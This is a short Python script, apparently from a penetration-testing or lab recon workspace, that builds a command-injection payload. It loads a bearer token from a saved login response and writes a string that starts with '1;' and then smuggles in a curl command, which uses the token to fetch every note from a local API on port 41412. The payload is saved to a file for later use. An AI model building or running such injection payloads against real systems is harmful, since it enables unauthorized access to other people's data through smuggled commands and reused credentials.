import json
from pathlib import Path
inj_path = Path('/workspace/recon/tmp/inj.txt')
login_path = Path('/workspace/recon/httpx/login_resp.json')
with login_path.open() as f:
    tok = json.load(f)['token']
cmd = f"1;curl -s -H 'Authorization: Bearer {tok}' http://127.0.0.1:41412/api/notes/all"
inj_path.parent.mkdir(parents=True, exist_ok=True)
inj_path.write_text(cmd)
print(str(inj_path))
